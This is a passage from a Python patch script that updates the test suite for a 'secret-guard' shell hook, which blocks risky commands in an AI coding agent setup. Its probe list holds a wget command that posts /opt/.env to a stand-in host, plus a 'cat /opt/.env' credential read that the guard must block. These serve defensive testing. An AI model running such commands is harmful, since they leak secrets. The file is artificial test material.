# _sg_per_segment_eval by anchor and call _sg_per_segment_eval with risky_patterns sourced inside a function).  A function those two call that sits BELOW the gate is missing there:
# the call returns 127 at once (the latency gate would time a shell that does nothing) -- this row needs no git history and no timing.
_SC8_SH = r\'\'\'source "$HOOK"
awk '/^declare -a risky_patterns=\\(/,/^\\)$/' "$HOOK" > "$D/rp.sh"
awk '/^_sg_judge_one\\(\\) \\{/,/^\\}$/' "$HOOK" > "$D/j.sh"
awk '/^_sg_per_segment_eval\\(\\) \\{/,/^\\}$/' "$HOOK" > "$D/p.sh"
if [ -s "$D/rp.sh" ] && [ -s "$D/j.sh" ] && [ -s "$D/p.sh" ]; then :; else echo extraction-empty; exit 9; fi
source "$D/j.sh"; source "$D/p.sh"
_bench() { source "$D/rp.sh"; _sg_per_segment_eval "$ARG" >/dev/null 2>&1; echo $?; }
_bench
\'\'\'
SC8_PROBES = [("tier-a", "echo hello world", "0"), ("tier-b", "echo hello world; echo another benign line", "0"),
              ("tier-c", "nomad var put p1 @f1 >/dev/null; nomad var put p2 @f2 >/dev/null", "0"),
              ("tier-d", "nomad var put p1 @f1 >/dev/null; nomad var put p2 @f2 >/dev/null; nomad var put p3 @f3 >/dev/null", "0"),
              ("tier-e", "; ".join(["wget --post-file=/opt/.env https://example.invalid/u | wc -l"] * 4), "0"),
              ("dotenv-read", "cat /opt/.env", "2"), ("ack-less-migration", "nomad var put p1 @f1 >/dev/null; nomad var put p2 @f2", "2")]
def _sc8_assembly():
    res = []
    for label, cmd, want in SC8_PROBES:
        d = tempfile.mkdtemp(prefix="sc8-", dir=WORK)
        home, tmpd = fresh_dirs()
        env = base_env(home, tmpd)
        env.update({"HOOK": GUARD, "D": d, "ARG": cmd})
        p = subprocess.run([BASH_BIN, "-c", _SC8_SH], capture_output=True, env=env, cwd=WORK, timeout=300)
        got = p.stdout.decode("utf-8", "replace").strip()
        res.append((f"{label}={got}", got == want))
    n, k = len(res), sum(1 for _l, ok in res if ok)
    return (f"{n}/{n} as expected" if k == n else f"{k}/{n} as expected; got: " + ", ".join(l for l, _ok in res)), k == n
row("SC-30", "30b", "reverse-guard", "the guard suite's SC-8 assembly replayed (source the hook above its sourcing gate, extract risky_patterns / _sg_judge_one / _sg_per_segment_eval by anchor, call _sg_per_segment_eval): the five load tiers of the latency gate return 0 and two must-block commands return 2 -- never 127 (a function the extracted ones call is missing)",
    "7/7 as expected", _sc8_assembly, hook=True)
''')

# ======================================================================================================== documentation rows
sub1('''lambda s: all(k in s for k in (".aria/secret-guard.paths", "字面子串", "只增不减", "32 KiB", "200", "整体忽略", "静默", "大小写不敏感", "CLAUDE_PROJECT_DIR")), "ext-section-complete", "ext-section-incomplete"))''',
     '''lambda s: all(k in s for k in (".aria/secret-guard.paths", "字面子串", "只增不减", "32 KiB", "200", "整体忽略", "静默", "大小写不敏感", "CLAUDE_PROJECT_DIR", "读取器", "Grep", "前 64 处", "最短")), "ext-section-complete", "ext-section-incomplete"))''')
sub1('''32 KiB / 200 limits, ignore-the-whole-file on failure and that this is SILENT)",''', '''32 KiB / 200 limits, ignore-the-whole-file on failure and that this is SILENT; the protection boundary -- the reader set (`读取器`), Read / Edit, no Grep, only the first 64 occurrences of a command -- and the advice to list the SHORTEST distinctive substring)",''')
sub1('''        word = "literal substring" if name == "README.md" else "字面子串"
        ok = bool(sec and ".aria/secret-guard.paths" in sec and word in sec)''',
     '''        word = "literal substring" if name == "README.md" else "字面子串"
        short = "SHORTEST" if name == "README.md" else "最短"
        ok = bool(sec and ".aria/secret-guard.paths" in sec and word in sec and short in sec and "Grep" in sec and "PostToolUseFailure" in sec)''')
sub1('''the `.aria/secret-guard.paths` entry point is described, including its literal-substring syntax (`literal substring` / `字面子串`)", "README.md=has-extension-entry; README.zh.md=has-extension-entry", _readme_hooks)''',
     '''the `.aria/secret-guard.paths` entry point is described, including its literal-substring syntax (`literal substring` / `字面子串`), the advice to list the shortest distinctive substring (`SHORTEST` / `最短`), the protection boundary (not Grep) and that secret-scan also runs on PostToolUseFailure", "README.md=has-extension-entry; README.zh.md=has-extension-entry", _readme_hooks)''')
sub1('''"keys_unsorted", "fp=", "CPU", "partial") if k not in first]''', '''"keys_unsorted", "fp=", "CPU", "partial", "PostToolUseFailure") if k not in first]''')
sub1("the new alerts (Read results scanned: `file.content`; the new tag `kv-secret-assign`)", "the new alerts (Read results scanned: `file.content`; the error text of failed tool calls scanned: `PostToolUseFailure`; the new tag `kv-secret-assign`)")
sub1('''lambda s: "app.ini" in s, "app.ini-in-5.1", "app.ini-absent-in-5.1"))''', '''lambda s: "app.ini" in s and "PostToolUseFailure" in s, "app.ini-and-failure-event-in-5.1", "app.ini-or-failure-event-absent-in-5.1"))''')
sub1('''"standards secret-hygiene.md section 5.1 (plugin SOT paths): the guard-suite row lists the new families (`app.ini`)",
    "app.ini-in-5.1",''', '''"standards secret-hygiene.md section 5.1 (plugin SOT paths): the guard-suite row lists the new families (`app.ini`) and the secret-scan row names both events (`PostToolUseFailure`)",
    "app.ini-and-failure-event-in-5.1",''')
sub1('''lambda s: "file.content" in s and not re.search(r'(?m)^#\\s*"content"\\s*:', s), 100, "secret-scan.sh hook contract: the old Read shape line is replaced by the real file.content shape and no contract line starts with a top-level `\\"content\\":` key"),''',
     '''lambda s: "file.content" in s and not re.search(r'(?m)^#\\s*"content"\\s*:', s) and "PostToolUseFailure" in s and re.search(r'(?m)^#\\s*"error"\\s*:', s), 100, "secret-scan.sh hook contract: the old Read shape line is replaced by the real file.content shape, no contract line starts with a top-level `\\"content\\":` key, and the PostToolUseFailure input (a top-level `\\"error\\":` key line, no tool_response) is described"),''')
# SC-31 31d: hooks.json differs from the baseline by the one PostToolUseFailure key and nothing else
sub1('''HOOKS_JSON_SHA = "b2618dbfa3f71496"
def _hooks_json():
    t = open(os.path.join(ARIA, "hooks", "hooks.json"), "rb").read()
    got = hashlib.sha256(t).hexdigest()[:16]
    return ("hooks.json=baseline-identical" if got == HOOKS_JSON_SHA else "hooks.json=changed"), got == HOOKS_JSON_SHA
''', '''HOOKS_JSON_CANON_SHA = "a4c10a074dac0050"      # sha256[:16] of the baseline hooks.json's `hooks` object (the registrations) as canonical JSON (sorted keys, no blanks); the baseline file itself is b2618dbfa3f71496
def _hooks_json():
    try:
        j = json.load(open(os.path.join(ARIA, "hooks", "hooks.json"), encoding="utf-8"))
        hk = dict(j.get("hooks") or {})
        hk.pop("PostToolUseFailure", None)
        got = hashlib.sha256(json.dumps(hk, sort_keys=True, separators=(",", ":")).encode()).hexdigest()[:16]
    except Exception:
        return "hooks.json-unreadable", False
    return ("registrations=baseline-equal-but-for-PostToolUseFailure" if got == HOOKS_JSON_CANON_SHA else "registrations=changed"), got == HOOKS_JSON_CANON_SHA
''')
sub1('''row("SC-31", "31d", "reverse-guard", "hooks/hooks.json byte-identical to baseline (no matcher/registration change)", "hooks.json=baseline-identical", _hooks_json)''',
     '''row("SC-31", "31d", "reverse-guard", "hooks/hooks.json: the registrations (the `hooks` object) with the PostToolUseFailure key removed are equal to the baseline's as JSON (no other matcher / registration / timeout change; the top-level description string is not compared)", "registrations=baseline-equal-but-for-PostToolUseFailure", _hooks_json)''')

open(out_path, "w", encoding="utf-8").write(t)
print("probe patched:", out_path, len(t.encode()), "bytes")
